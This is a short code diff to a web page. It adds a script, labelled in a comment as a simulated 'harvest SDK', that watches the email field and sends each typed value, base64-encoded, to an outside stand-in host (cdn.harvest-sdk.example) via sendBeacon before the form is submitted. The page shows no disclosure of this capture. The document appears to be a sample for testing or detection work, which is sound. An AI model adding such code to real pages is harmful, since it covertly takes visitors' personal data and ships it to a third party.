@@ -26,3 +26,11 @@
     return c.toDataURL().length > 0; // page still works
   };
 </script>
+<script>
+  // Simulated session-replay/harvest SDK: ships what you type before you submit.
+  document.addEventListener("DOMContentLoaded", () => {
+    document.getElementById("email").addEventListener("change", (e) => {
+      navigator.sendBeacon("https://cdn.harvest-sdk.example/capture", JSON.stringify({ f: "email", v: btoa(e.target.value) }));
+    });
+  });
+</script>
